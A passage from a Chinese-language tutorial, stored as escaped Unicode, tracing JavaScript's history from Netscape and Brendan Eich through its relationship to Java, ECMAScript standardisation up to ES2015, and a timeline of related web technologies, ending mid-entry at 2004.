1992\u5e74\u5e95\uff0c\u7f8e\u56fd\u56fd\u5bb6\u8d85\u7ea7\u7535\u8111\u5e94\u7528\u4e2d\u5fc3\uff08NCSA\uff09\u5f00\u59cb\u5f00\u53d1\u4e00\u4e2a\u72ec\u7acb\u7684\u6d4f\u89c8\u5668\uff0c\u53eb\u505a Mosaic\u3002\u8fd9\u662f\u4eba\u7c7b\u5386\u53f2\u4e0a\u7b2c\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0c\u4ece\u6b64\u7f51\u9875\u53ef\u4ee5\u5728\u56fe\u5f62\u754c\u9762\u7684\u7a97\u53e3\u6d4f\u89c8\u3002 1994\u5e7410\u6708\uff0cNCSA \u7684\u4e00\u4e2a\u4e3b\u8981\u7a0b\u5e8f\u5458 Marc Andreessen \u8054\u5408\u98ce\u9669\u6295\u8d44\u5bb6 Jim Clark\uff0c\u6210\u7acb\u4e86 Mosaic \u901a\u4fe1\u516c\u53f8\uff08Mosaic Communications\uff09\uff0c\u4e0d\u4e45\u540e\u6539\u540d\u4e3a Netscape\u3002\u8fd9\u5bb6\u516c\u53f8\u7684\u65b9\u5411\uff0c\u5c31\u662f\u5728 Mosaic \u7684\u57fa\u7840\u4e0a\uff0c\u5f00\u53d1\u9762\u5411\u666e\u901a\u7528\u6237\u7684\u65b0\u4e00\u4ee3\u7684\u6d4f\u89c8\u5668 Netscape Navigator\u3002 1994\u5e7412\u6708\uff0cNavigator \u53d1\u5e03\u4e861.0\u7248\uff0c\u5e02\u573a\u4efd\u989d\u4e00\u4e3e\u8d85\u8fc790%\u3002 Netscape \u516c\u53f8\u5f88\u5feb\u53d1\u73b0\uff0cNavigator \u6d4f\u89c8\u5668\u9700\u8981\u4e00\u79cd\u53ef\u4ee5\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7528\u6765\u63a7\u5236\u6d4f\u89c8\u5668\u884c\u4e3a\u3002\u5f53\u65f6\uff0c\u7f51\u901f\u5f88\u6162\u800c\u4e14\u4e0a\u7f51\u8d39\u5f88\u8d35\uff0c\u6709\u4e9b\u64cd\u4f5c\u4e0d\u5b9c\u5728\u670d\u52a1\u5668\u7aef\u5b8c\u6210\u3002\u6bd4\u5982\uff0c\u5982\u679c\u7528\u6237\u5fd8\u8bb0\u586b\u5199\u201c\u7528\u6237\u540d\u201d\uff0c\u5c31\u70b9\u4e86\u201c\u53d1\u9001\u201d\u6309\u94ae\uff0c\u5230\u670d\u52a1\u5668\u518d\u53d1\u73b0\u8fd9\u4e00\u70b9\u5c31\u6709\u70b9\u592a\u665a\u4e86\uff0c\u6700\u597d\u80fd\u5728\u7528\u6237\u53d1\u51fa\u6570\u636e\u4e4b\u524d\uff0c\u5c31\u544a\u8bc9\u7528\u6237\u201c\u8bf7\u586b\u5199\u7528\u6237\u540d\u201d\u3002\u8fd9\u5c31\u9700\u8981\u5728\u7f51\u9875\u4e2d\u5d4c\u5165\u5c0f\u7a0b\u5e8f\uff0c\u8ba9\u6d4f\u89c8\u5668\u68c0\u67e5\u6bcf\u4e00\u680f\u662f\u5426\u90fd\u586b\u5199\u4e86\u3002 \u7ba1\u7406\u5c42\u5bf9\u8fd9\u79cd\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u7684\u8bbe\u60f3\u662f\uff1a\u529f\u80fd\u4e0d\u9700\u8981\u592a\u5f3a\uff0c\u8bed\u6cd5\u8f83\u4e3a\u7b80\u5355\uff0c\u5bb9\u6613\u5b66\u4e60\u548c\u90e8\u7f72\u3002\u90a3\u4e00\u5e74\uff0c\u6b63\u9022 Sun \u516c\u53f8\u7684 Java \u8bed\u8a00\u95ee\u4e16\uff0c\u5e02\u573a\u63a8\u5e7f\u6d3b\u52a8\u975e\u5e38\u6210\u529f\u3002Netscape \u516c\u53f8\u51b3\u5b9a\u4e0e Sun \u516c\u53f8\u5408\u4f5c\uff0c\u6d4f\u89c8\u5668\u652f\u6301\u5d4c\u5165 Java \u5c0f\u7a0b\u5e8f\uff08\u540e\u6765\u79f0\u4e3a Java applet\uff09\u3002\u4f46\u662f\uff0c\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u662f\u5426\u5c31\u9009\u7528 Java\uff0c\u5219\u5b58\u5728\u4e89\u8bba\u3002\u540e\u6765\uff0c\u8fd8\u662f\u51b3\u5b9a\u4e0d\u4f7f\u7528 Java\uff0c\u56e0\u4e3a\u7f51\u9875\u5c0f\u7a0b\u5e8f\u4e0d\u9700\u8981 Java \u8fd9\u4e48\u201c\u91cd\u201d\u7684\u8bed\u6cd5\u3002\u4f46\u662f\uff0c\u540c\u65f6\u4e5f\u51b3\u5b9a\u811a\u672c\u8bed\u8a00\u7684\u8bed\u6cd5\u8981\u63a5\u8fd1 Java\uff0c\u5e76\u4e14\u53ef\u4ee5\u652f\u6301 Java \u7a0b\u5e8f\u3002\u8fd9\u4e9b\u8bbe\u60f3\u76f4\u63a5\u6392\u9664\u4e86\u4f7f\u7528\u73b0\u5b58\u8bed\u8a00\uff0c\u6bd4\u5982 Perl\u3001Python \u548c TCL\u3002 1995\u5e74\uff0cNetscape \u516c\u53f8\u96c7\u4f63\u4e86\u7a0b\u5e8f\u5458 Brendan Eich \u5f00\u53d1\u8fd9\u79cd\u7f51\u9875\u811a\u672c\u8bed\u8a00\u3002Brendan Eich \u6709\u5f88\u5f3a\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\u80cc\u666f\uff0c\u5e0c\u671b\u4ee5 Scheme \u8bed\u8a00\uff08\u51fd\u6570\u5f0f\u8bed\u8a00\u9f3b\u7956 LISP \u8bed\u8a00\u7684\u4e00\u79cd\u65b9\u8a00\uff09\u4e3a\u84dd\u672c\uff0c\u5b9e\u73b0\u8fd9\u79cd\u65b0\u8bed\u8a00\u3002 1995\u5e745\u6708\uff0cBrendan Eich \u53ea\u7528\u4e8610\u5929\uff0c\u5c31\u8bbe\u8ba1\u5b8c\u6210\u4e86\u8fd9\u79cd\u8bed\u8a00\u7684\u7b2c\u4e00\u7248\u3002\u5b83\u662f\u4e00\u4e2a\u5927\u6742\u70e9\uff0c\u8bed\u6cd5\u6709\u591a\u4e2a\u6765\u6e90\u3002 \u57fa\u672c\u8bed\u6cd5\uff1a\u501f\u9274 C \u8bed\u8a00\u548c Java \u8bed\u8a00\u3002 \u6570\u636e\u7ed3\u6784\uff1a\u501f\u9274 Java \u8bed\u8a00\uff0c\u5305\u62ec\u5c06\u503c\u5206\u6210\u539f\u59cb\u503c\u548c\u5bf9\u8c61\u4e24\u5927\u7c7b\u3002 \u51fd\u6570\u7684\u7528\u6cd5\uff1a\u501f\u9274 Scheme \u8bed\u8a00\u548c Awk \u8bed\u8a00\uff0c\u5c06\u51fd\u6570\u5f53\u4f5c\u7b2c\u4e00\u7b49\u516c\u6c11\uff0c\u5e76\u5f15\u5165\u95ed\u5305\u3002 \u539f\u578b\u7ee7\u627f\u6a21\u578b\uff1a\u501f\u9274 Self \u8bed\u8a00\uff08Smalltalk \u7684\u4e00\u79cd\u53d8\u79cd\uff09\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f\uff1a\u501f\u9274 Perl \u8bed\u8a00\u3002 \u5b57\u7b26\u4e32\u548c\u6570\u7ec4\u5904\u7406\uff1a\u501f\u9274 Python \u8bed\u8a00\u3002 \u4e3a\u4e86\u4fdd\u6301\u7b80\u5355\uff0c\u8fd9\u79cd\u811a\u672c\u8bed\u8a00\u7f3a\u5c11\u4e00\u4e9b\u5173\u952e\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u5757\u7ea7\u4f5c\u7528\u57df\u3001\u6a21\u5757\u3001\u5b50\u7c7b\u578b\uff08subtyping\uff09\u7b49\u7b49\uff0c\u4f46\u662f\u53ef\u4ee5\u5229\u7528\u73b0\u6709\u529f\u80fd\u627e\u51fa\u89e3\u51b3\u529e\u6cd5\u3002\u8fd9\u79cd\u529f\u80fd\u7684\u4e0d\u8db3\uff0c\u76f4\u63a5\u5bfc\u81f4\u4e86\u540e\u6765 JavaScript \u7684\u4e00\u4e2a\u663e\u8457\u7279\u70b9\uff1a\u5bf9\u4e8e\u5176\u4ed6\u8bed\u8a00\uff0c\u4f60\u9700\u8981\u5b66\u4e60\u8bed\u8a00\u7684\u5404\u79cd\u529f\u80fd\uff0c\u800c\u5bf9\u4e8e JavaScript\uff0c\u4f60\u5e38\u5e38\u9700\u8981\u5b66\u4e60\u5404\u79cd\u89e3\u51b3\u95ee\u9898\u7684\u6a21\u5f0f\u3002\u800c\u4e14\u7531\u4e8e\u6765\u6e90\u591a\u6837\uff0c\u4ece\u4e00\u5f00\u59cb\u5c31\u6ce8\u5b9a\uff0cJavaScript \u7684\u7f16\u7a0b\u98ce\u683c\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u548c\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u4e00\u79cd\u6df7\u5408\u4f53\u3002 Netscape \u516c\u53f8\u7684\u8fd9\u79cd\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\uff0c\u6700\u521d\u540d\u5b57\u53eb\u505a Mocha\uff0c1995\u5e749\u6708\u6539\u4e3a LiveScript\u300212\u6708\uff0cNetscape \u516c\u53f8\u4e0e Sun \u516c\u53f8\uff08Java \u8bed\u8a00\u7684\u53d1\u660e\u8005\u548c\u6240\u6709\u8005\uff09\u8fbe\u6210\u534f\u8bae\uff0c\u540e\u8005\u5141\u8bb8\u5c06\u8fd9\u79cd\u8bed\u8a00\u53eb\u505a JavaScript\u3002\u8fd9\u6837\u4e00\u6765\uff0cNetscape \u516c\u53f8\u53ef\u4ee5\u501f\u52a9 Java \u8bed\u8a00\u7684\u58f0\u52bf\uff0c\u800c Sun \u516c\u53f8\u5219\u5c06\u81ea\u5df1\u7684\u5f71\u54cd\u529b\u6269\u5c55\u5230\u4e86\u6d4f\u89c8\u5668\u3002 \u4e4b\u6240\u4ee5\u8d77\u8fd9\u4e2a\u540d\u5b57\uff0c\u5e76\u4e0d\u662f\u56e0\u4e3a JavaScript \u672c\u8eab\u4e0e Java \u8bed\u8a00\u6709\u591a\u4e48\u6df1\u7684\u5173\u7cfb\uff08\u4e8b\u5b9e\u4e0a\uff0c\u4e24\u8005\u5173\u7cfb\u5e76\u4e0d\u6df1\uff0c\u8be6\u89c1\u4e0b\u8282\uff09\uff0c\u800c\u662f\u56e0\u4e3a Netscape \u516c\u53f8\u5df2\u7ecf\u51b3\u5b9a\uff0c\u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0cJavaScript \u53ef\u4ee5\u50cf\u80f6\u6c34\u4e00\u6837\uff0c\u5c06\u5404\u4e2a\u90e8\u5206\u8fde\u63a5\u8d77\u6765\u3002\u5f53\u7136\uff0c\u540e\u6765\u7684\u5386\u53f2\u662f Java \u8bed\u8a00\u7684\u6d4f\u89c8\u5668\u63d2\u4ef6\u5931\u8d25\u4e86\uff0cJavaScript \u53cd\u800c\u53d1\u626c\u5149\u5927\u3002 1995\u5e7412\u67084\u65e5\uff0cNetscape \u516c\u53f8\u4e0e Sun \u516c\u53f8\u8054\u5408\u53d1\u5e03\u4e86 JavaScript \u8bed\u8a00\uff0c\u5bf9\u5916\u5ba3\u4f20 JavaScript \u662f Java \u7684\u8865\u5145\uff0c\u5c5e\u4e8e\u8f7b\u91cf\u7ea7\u7684 Java\uff0c\u4e13\u95e8\u7528\u6765\u64cd\u4f5c\u7f51\u9875\u3002 1996\u5e743\u6708\uff0cNavigator 2.0 \u6d4f\u89c8\u5668\u6b63\u5f0f\u5185\u7f6e\u4e86 JavaScript \u811a\u672c\u8bed\u8a00\u3002 JavaScript \u4e0e Java \u7684\u5173\u7cfb \u00b6 \u8fd9\u91cc\u4e13\u95e8\u8bf4\u4e00\u4e0b JavaScript \u548c Java \u7684\u5173\u7cfb\u3002\u5b83\u4eec\u662f\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u8bed\u8a00\uff0c\u4f46\u662f\u5f7c\u6b64\u5b58\u5728\u8054\u7cfb\u3002 JavaScript \u7684\u57fa\u672c\u8bed\u6cd5\u548c\u5bf9\u8c61\u4f53\u7cfb\uff0c\u662f\u6a21\u4eff Java \u800c\u8bbe\u8ba1\u7684\u3002\u4f46\u662f\uff0cJavaScript \u6ca1\u6709\u91c7\u7528 Java \u7684\u9759\u6001\u7c7b\u578b\u3002\u6b63\u662f\u56e0\u4e3a JavaScript \u4e0e Java \u6709\u5f88\u5927\u7684\u76f8\u4f3c\u6027\uff0c\u6240\u4ee5\u8fd9\u95e8\u8bed\u8a00\u624d\u4ece\u4e00\u5f00\u59cb\u7684 LiveScript \u6539\u540d\u4e3a JavaScript\u3002\u57fa\u672c\u4e0a\uff0cJavaScript \u8fd9\u4e2a\u540d\u5b57\u7684\u539f\u610f\u662f\u201c\u5f88\u50cfJava\u7684\u811a\u672c\u8bed\u8a00\u201d\u3002 JavaScript \u8bed\u8a00\u7684\u51fd\u6570\u662f\u4e00\u79cd\u72ec\u7acb\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4ee5\u53ca\u91c7\u7528\u57fa\u4e8e\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\u7684\u7ee7\u627f\u94fe\u3002\u8fd9\u662f\u5b83\u4e0e Java \u8bed\u6cd5\u6700\u5927\u7684\u4e24\u70b9\u533a\u522b\u3002JavaScript \u8bed\u6cd5\u8981\u6bd4 Java \u81ea\u7531\u5f97\u591a\u3002 \u53e6\u5916\uff0cJava \u8bed\u8a00\u9700\u8981\u7f16\u8bd1\uff0c\u800c JavaScript \u8bed\u8a00\u5219\u662f\u8fd0\u884c\u65f6\u7531\u89e3\u91ca\u5668\u76f4\u63a5\u6267\u884c\u3002 \u603b\u4e4b\uff0cJavaScript \u7684\u539f\u59cb\u8bbe\u8ba1\u76ee\u6807\u662f\u4e00\u79cd\u5c0f\u578b\u7684\u3001\u7b80\u5355\u7684\u52a8\u6001\u8bed\u8a00\uff0c\u4e0e Java \u6709\u8db3\u591f\u7684\u76f8\u4f3c\u6027\uff0c\u4f7f\u5f97\u4f7f\u7528\u8005\uff08\u5c24\u5176\u662f Java \u7a0b\u5e8f\u5458\uff09\u53ef\u4ee5\u5feb\u901f\u4e0a\u624b\u3002 JavaScript \u4e0e ECMAScript \u7684\u5173\u7cfb \u00b6 1996\u5e748\u6708\uff0c\u5fae\u8f6f\u6a21\u4eff JavaScript \u5f00\u53d1\u4e86\u4e00\u79cd\u76f8\u8fd1\u7684\u8bed\u8a00\uff0c\u53d6\u540d\u4e3aJScript\uff08JavaScript \u662f Netscape \u7684\u6ce8\u518c\u5546\u6807\uff0c\u5fae\u8f6f\u4e0d\u80fd\u7528\uff09\uff0c\u9996\u5148\u5185\u7f6e\u4e8eIE 3.0\u3002Netscape \u516c\u53f8\u9762\u4e34\u4e27\u5931\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u7684\u4e3b\u5bfc\u6743\u7684\u5c40\u9762\u3002 1996\u5e7411\u6708\uff0cNetscape \u516c\u53f8\u51b3\u5b9a\u5c06 JavaScript \u63d0\u4ea4\u7ed9\u56fd\u9645\u6807\u51c6\u5316\u7ec4\u7ec7 ECMA\uff08European Computer Manufacturers Association\uff09\uff0c\u5e0c\u671b JavaScript \u80fd\u591f\u6210\u4e3a\u56fd\u9645\u6807\u51c6\uff0c\u4ee5\u6b64\u62b5\u6297\u5fae\u8f6f\u3002ECMA \u768439\u53f7\u6280\u672f\u59d4\u5458\u4f1a\uff08Technical Committee 39\uff09\u8d1f\u8d23\u5236\u5b9a\u548c\u5ba1\u6838\u8fd9\u4e2a\u6807\u51c6\uff0c\u6210\u5458\u7531\u4e1a\u5185\u7684\u5927\u516c\u53f8\u6d3e\u51fa\u7684\u5de5\u7a0b\u5e08\u7ec4\u6210\uff0c\u76ee\u524d\u517125\u4e2a\u4eba\u3002\u8be5\u59d4\u5458\u4f1a\u5b9a\u671f\u5f00\u4f1a\uff0c\u6240\u6709\u7684\u90ae\u4ef6\u8ba8\u8bba\u548c\u4f1a\u8bae\u8bb0\u5f55\uff0c\u90fd\u662f\u516c\u5f00\u7684\u3002 1997\u5e747\u6708\uff0cECMA \u7ec4\u7ec7\u53d1\u5e03262\u53f7\u6807\u51c6\u6587\u4ef6\uff08ECMA-262\uff09\u7684\u7b2c\u4e00\u7248\uff0c\u89c4\u5b9a\u4e86\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u7684\u6807\u51c6\uff0c\u5e76\u5c06\u8fd9\u79cd\u8bed\u8a00\u79f0\u4e3a ECMAScript\u3002\u8fd9\u4e2a\u7248\u672c\u5c31\u662f ECMAScript 1.0 \u7248\u3002\u4e4b\u6240\u4ee5\u4e0d\u53eb JavaScript\uff0c\u4e00\u65b9\u9762\u662f\u7531\u4e8e\u5546\u6807\u7684\u5173\u7cfb\uff0cJava \u662f Sun \u516c\u53f8\u7684\u5546\u6807\uff0c\u6839\u636e\u4e00\u4efd\u6388\u6743\u534f\u8bae\uff0c\u53ea\u6709 Netscape \u516c\u53f8\u53ef\u4ee5\u5408\u6cd5\u5730\u4f7f\u7528 JavaScript \u8fd9\u4e2a\u540d\u5b57\uff0c\u4e14 JavaScript \u5df2\u7ecf\u88ab Netscape \u516c\u53f8\u6ce8\u518c\u4e3a\u5546\u6807\uff0c\u53e6\u4e00\u65b9\u9762\u4e5f\u662f\u60f3\u4f53\u73b0\u8fd9\u95e8\u8bed\u8a00\u7684\u5236\u5b9a\u8005\u662f ECMA\uff0c\u4e0d\u662f Netscape\uff0c\u8fd9\u6837\u6709\u5229\u4e8e\u4fdd\u8bc1\u8fd9\u95e8\u8bed\u8a00\u7684\u5f00\u653e\u6027\u548c\u4e2d\u7acb\u6027\u3002\u56e0\u6b64\uff0cECMAScript \u548c JavaScript \u7684\u5173\u7cfb\u662f\uff0c\u524d\u8005\u662f\u540e\u8005\u7684\u89c4\u683c\uff0c\u540e\u8005\u662f\u524d\u8005\u7684\u4e00\u79cd\u5b9e\u73b0\u3002\u5728\u65e5\u5e38\u573a\u5408\uff0c\u8fd9\u4e24\u4e2a\u8bcd\u662f\u53ef\u4ee5\u4e92\u6362\u7684\u3002 ECMAScript \u53ea\u7528\u6765\u6807\u51c6\u5316 JavaScript \u8fd9\u79cd\u8bed\u8a00\u7684\u57fa\u672c\u8bed\u6cd5\u7ed3\u6784\uff0c\u4e0e\u90e8\u7f72\u73af\u5883\u76f8\u5173\u7684\u6807\u51c6\u90fd\u7531\u5176\u4ed6\u6807\u51c6\u89c4\u5b9a\uff0c\u6bd4\u5982 DOM \u7684\u6807\u51c6\u5c31\u662f\u7531 W3C\u7ec4\u7ec7\uff08World Wide Web Consortium\uff09\u5236\u5b9a\u7684\u3002 ECMA-262 \u6807\u51c6\u540e\u6765\u4e5f\u88ab\u53e6\u4e00\u4e2a\u56fd\u9645\u6807\u51c6\u5316\u7ec4\u7ec7 ISO\uff08International Organization for Standardization\uff09\u6279\u51c6\uff0c\u6807\u51c6\u53f7\u662f ISO-16262\u3002 JavaScript \u7684\u7248\u672c \u00b6 1997\u5e747\u6708\uff0cECMAScript 1.0\u53d1\u5e03\u3002 1998\u5e746\u6708\uff0cECMAScript 2.0\u7248\u53d1\u5e03\u3002 1999\u5e7412\u6708\uff0cECMAScript 3.0\u7248\u53d1\u5e03\uff0c\u6210\u4e3a JavaScript \u7684\u901a\u884c\u6807\u51c6\uff0c\u5f97\u5230\u4e86\u5e7f\u6cdb\u652f\u6301\u3002 2007\u5e7410\u6708\uff0cECMAScript 4.0\u7248\u8349\u6848\u53d1\u5e03\uff0c\u5bf93.0\u7248\u505a\u4e86\u5927\u5e45\u5347\u7ea7\uff0c\u9884\u8ba1\u6b21\u5e748\u6708\u53d1\u5e03\u6b63\u5f0f\u7248\u672c\u3002\u8349\u6848\u53d1\u5e03\u540e\uff0c\u7531\u4e8e4.0\u7248\u7684\u76ee\u6807\u8fc7\u4e8e\u6fc0\u8fdb\uff0c\u5404\u65b9\u5bf9\u4e8e\u662f\u5426\u901a\u8fc7\u8fd9\u4e2a\u6807\u51c6\uff0c\u53d1\u751f\u4e86\u4e25\u91cd\u5206\u6b67\u3002\u4ee5 Yahoo\u3001Microsoft\u3001Google \u4e3a\u9996\u7684\u5927\u516c\u53f8\uff0c\u53cd\u5bf9 JavaScript \u7684\u5927\u5e45\u5347\u7ea7\uff0c\u4e3b\u5f20\u5c0f\u5e45\u6539\u52a8\uff1b\u4ee5 JavaScript \u521b\u9020\u8005 Brendan Eich \u4e3a\u9996\u7684 Mozilla \u516c\u53f8\uff0c\u5219\u575a\u6301\u5f53\u524d\u7684\u8349\u6848\u3002 2008\u5e747\u6708\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0b\u4e00\u4e2a\u7248\u672c\u5e94\u8be5\u5305\u62ec\u54ea\u4e9b\u529f\u80fd\uff0c\u5404\u65b9\u5206\u6b67\u592a\u5927\uff0c\u4e89\u8bba\u8fc7\u4e8e\u6fc0\u8fdb\uff0cECMA \u5f00\u4f1a\u51b3\u5b9a\uff0c\u4e2d\u6b62 ECMAScript 4.0 \u7684\u5f00\u53d1\uff08\u5373\u5e9f\u9664\u4e86\u8fd9\u4e2a\u7248\u672c\uff09\uff0c\u5c06\u5176\u4e2d\u6d89\u53ca\u73b0\u6709\u529f\u80fd\u6539\u5584\u7684\u4e00\u5c0f\u90e8\u5206\uff0c\u53d1\u5e03\u4e3a ECMAScript 3.1\uff0c\u800c\u5c06\u5176\u4ed6\u6fc0\u8fdb\u7684\u8bbe\u60f3\u6269\u5927\u8303\u56f4\uff0c\u653e\u5165\u4ee5\u540e\u7684\u7248\u672c\uff0c\u7531\u4e8e\u4f1a\u8bae\u7684\u6c14\u6c1b\uff0c\u8be5\u7248\u672c\u7684\u9879\u76ee\u4ee3\u53f7\u8d77\u540d\u4e3a Harmony\uff08\u548c\u8c10\uff09\u3002\u4f1a\u540e\u4e0d\u4e45\uff0cECMAScript 3.1 \u5c31\u6539\u540d\u4e3a ECMAScript 5\u3002 2009\u5e7412\u6708\uff0cECMAScript 5.0\u7248 \u6b63\u5f0f\u53d1\u5e03\u3002Harmony \u9879\u76ee\u5219\u4e00\u5206\u4e3a\u4e8c\uff0c\u4e00\u4e9b\u8f83\u4e3a\u53ef\u884c\u7684\u8bbe\u60f3\u5b9a\u540d\u4e3a JavaScript.next \u7ee7\u7eed\u5f00\u53d1\uff0c\u540e\u6765\u6f14\u53d8\u6210 ECMAScript 6\uff1b\u4e00\u4e9b\u4e0d\u662f\u5f88\u6210\u719f\u7684\u8bbe\u60f3\uff0c\u5219\u88ab\u89c6\u4e3a JavaScript.next.next\uff0c\u5728\u66f4\u8fdc\u7684\u5c06\u6765\u518d\u8003\u8651\u63a8\u51fa\u3002TC39 \u7684\u603b\u4f53\u8003\u8651\u662f\uff0cECMAScript 5 \u4e0e ECMAScript 3 \u57fa\u672c\u4fdd\u6301\u517c\u5bb9\uff0c\u8f83\u5927\u7684\u8bed\u6cd5\u4fee\u6b63\u548c\u65b0\u529f\u80fd\u52a0\u5165\uff0c\u5c06\u7531 JavaScript.next \u5b8c\u6210\u3002\u5f53\u65f6\uff0cJavaScript.next \u6307\u7684\u662fECMAScript 6\u3002\u7b2c\u516d\u7248\u53d1\u5e03\u4ee5\u540e\uff0c\u5c06\u6307 ECMAScript 7\u3002TC39 \u9884\u8ba1\uff0cECMAScript 5 \u4f1a\u57282013\u5e74\u7684\u5e74\u4e2d\u6210\u4e3a JavaScript \u5f00\u53d1\u7684\u4e3b\u6d41\u6807\u51c6\uff0c\u5e76\u5728\u6b64\u540e\u4e94\u5e74\u4e2d\u4e00\u76f4\u4fdd\u6301\u8fd9\u4e2a\u4f4d\u7f6e\u3002 2011\u5e746\u6708\uff0cECMAScript 5.1\u7248\u53d1\u5e03\uff0c\u5e76\u4e14\u6210\u4e3a ISO \u56fd\u9645\u6807\u51c6\uff08ISO/IEC 16262:2011\uff09\u3002\u5230\u4e862012\u5e74\u5e95\uff0c\u6240\u6709\u4e3b\u8981\u6d4f\u89c8\u5668\u90fd\u652f\u6301 ECMAScript 5.1\u7248\u7684\u5168\u90e8\u529f\u80fd\u3002 2013\u5e743\u6708\uff0cECMAScript 6 \u8349\u6848\u51bb\u7ed3\uff0c\u4e0d\u518d\u6dfb\u52a0\u65b0\u529f\u80fd\u3002\u65b0\u7684\u529f\u80fd\u8bbe\u60f3\u5c06\u88ab\u653e\u5230 ECMAScript 7\u3002 2013\u5e7412\u6708\uff0cECMAScript 6 \u8349\u6848\u53d1\u5e03\u3002\u7136\u540e\u662f12\u4e2a\u6708\u7684\u8ba8\u8bba\u671f\uff0c\u542c\u53d6\u5404\u65b9\u53cd\u9988\u3002 2015\u5e746\u6708\uff0cECMAScript 6 \u6b63\u5f0f\u53d1\u5e03\uff0c\u5e76\u4e14\u66f4\u540d\u4e3a\u201cECMAScript 2015\u201d\u3002\u8fd9\u662f\u56e0\u4e3a TC39 \u59d4\u5458\u4f1a\u8ba1\u5212\uff0c\u4ee5\u540e\u6bcf\u5e74\u53d1\u5e03\u4e00\u4e2a ECMAScript \u7684\u7248\u672c\uff0c\u4e0b\u4e00\u4e2a\u7248\u672c\u57282016\u5e74\u53d1\u5e03\uff0c\u79f0\u4e3a\u201cECMAScript 2016\u201d\uff0c2017\u5e74\u53d1\u5e03\u201cECMAScript 2017\u201d\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 \u5468\u8fb9\u5927\u4e8b\u8bb0 \u00b6 JavaScript \u4f34\u968f\u7740\u4e92\u8054\u7f51\u7684\u53d1\u5c55\u4e00\u8d77\u53d1\u5c55\u3002\u4e92\u8054\u7f51\u5468\u8fb9\u6280\u672f\u7684\u5feb\u901f\u53d1\u5c55\uff0c\u523a\u6fc0\u548c\u63a8\u52a8\u4e86 JavaScript \u8bed\u8a00\u7684\u53d1\u5c55\u3002\u4e0b\u9762\uff0c\u56de\u987e\u4e00\u4e0b JavaScript \u7684\u5468\u8fb9\u5e94\u7528\u53d1\u5c55\u3002 1996\u5e74\uff0c\u6837\u5f0f\u8868\u6807\u51c6 CSS \u7b2c\u4e00\u7248\u53d1\u5e03\u3002 1997\u5e74\uff0cDHTML\uff08Dynamic HTML\uff0c\u52a8\u6001 HTML\uff09\u53d1\u5e03\uff0c\u5141\u8bb8\u52a8\u6001\u6539\u53d8\u7f51\u9875\u5185\u5bb9\u3002\u8fd9\u6807\u5fd7\u7740 DOM \u6a21\u5f0f\uff08Document Object Model\uff0c\u6587\u6863\u5bf9\u8c61\u6a21\u578b\uff09\u6b63\u5f0f\u5e94\u7528\u3002 1998\u5e74\uff0cNetscape \u516c\u53f8\u5f00\u6e90\u4e86\u6d4f\u89c8\u5668\uff0c\u8fd9\u5bfc\u81f4\u4e86 Mozilla \u9879\u76ee\u7684\u8bde\u751f\u3002\u51e0\u4e2a\u6708\u540e\uff0c\u7f8e\u56fd\u5728\u7ebf\uff08AOL\uff09\u5ba3\u5e03\u5e76\u8d2d Netscape\u3002 1999\u5e74\uff0cIE 5\u90e8\u7f72\u4e86 XMLHttpRequest \u63a5\u53e3\uff0c\u5141\u8bb8 JavaScript \u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u4e3a\u540e\u6765\u5927\u884c\u5176\u9053\u7684 Ajax \u5e94\u7528\u521b\u9020\u4e86\u6761\u4ef6\u3002 2000\u5e74\uff0cKDE \u9879\u76ee\u91cd\u5199\u4e86\u6d4f\u89c8\u5668\u5f15\u64ce KHTML\uff0c\u4e3a\u540e\u6765\u7684 WebKit \u548c Blink \u5f15\u64ce\u6253\u4e0b\u57fa\u7840\u3002\u8fd9\u4e00\u5e74\u768410\u670823\u65e5\uff0cKDE 2.0\u53d1\u5e03\uff0c\u7b2c\u4e00\u6b21\u5c06 KHTML \u6d4f\u89c8\u5668\u5305\u62ec\u5176\u4e2d\u3002 2001\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u65f6\u96945\u5e74\u4e4b\u540e\uff0c\u53d1\u5e03\u4e86 IE \u6d4f\u89c8\u5668\u7684\u4e0b\u4e00\u4e2a\u7248\u672c Internet Explorer 6\u3002\u8fd9\u662f\u5f53\u65f6\u6700\u5148\u8fdb\u7684\u6d4f\u89c8\u5668\uff0c\u5b83\u540e\u6765\u7edf\u6cbb\u4e86\u6d4f\u89c8\u5668\u5e02\u573a\u591a\u5e74\u3002 2001\u5e74\uff0cDouglas Crockford \u63d0\u51fa\u4e86 JSON \u683c\u5f0f\uff0c\u7528\u4e8e\u53d6\u4ee3 XML \u683c\u5f0f\uff0c\u8fdb\u884c\u670d\u52a1\u5668\u548c\u7f51\u9875\u4e4b\u95f4\u7684\u6570\u636e\u4ea4\u6362\u3002JavaScript \u53ef\u4ee5\u539f\u751f\u652f\u6301\u8fd9\u79cd\u683c\u5f0f\uff0c\u4e0d\u9700\u8981\u989d\u5916\u90e8\u7f72\u4ee3\u7801\u3002 2002\u5e74\uff0cMozilla \u9879\u76ee\u53d1\u5e03\u4e86\u5b83\u7684\u6d4f\u89c8\u5668\u7684\u7b2c\u4e00\u7248\uff0c\u540e\u6765\u8d77\u540d\u4e3a Firefox\u3002 2003\u5e74\uff0c\u82f9\u679c\u516c\u53f8\u53d1\u5e03\u4e86 Safari \u6d4f\u89c8\u5668\u7684\u7b2c\u4e00\u7248\u3002 2004\u5e74\uff0cGoogle \u516c\u53f8\u53d1\u5e03\u4e86 Gmail\uff0c\u4fc3\u6210\u4e86\u4e92\u8054\u7f51\u5e94\u7528\u7a0b\u5e8f\uff08Web 